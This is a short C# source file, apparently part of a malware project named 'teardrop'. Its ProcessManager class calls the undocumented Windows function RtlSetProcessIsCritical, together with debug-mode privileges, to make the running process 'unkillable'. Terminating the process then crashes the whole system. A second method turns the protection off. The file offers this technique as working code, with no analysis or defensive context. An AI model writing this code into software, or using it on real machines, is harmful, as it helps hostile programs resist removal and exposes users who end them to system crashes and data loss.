using System.Diagnostics;
using System.Runtime.InteropServices;

namespace teardrop.Classes
{
    internal sealed partial class ProcessManager
    {
        [LibraryImport("NTDLL.DLL", SetLastError = true)]
        private static partial void RtlSetProcessIsCritical(UInt32 v1, UInt32 v2, UInt32 v3);

        public static void ProcessUnkillable()      
        {
            Process.EnterDebugMode();
            RtlSetProcessIsCritical(1, 0, 0);
        }

        public static void ProcessKillable()        
        {
            RtlSetProcessIsCritical(0, 0, 0);
        }
    }
}
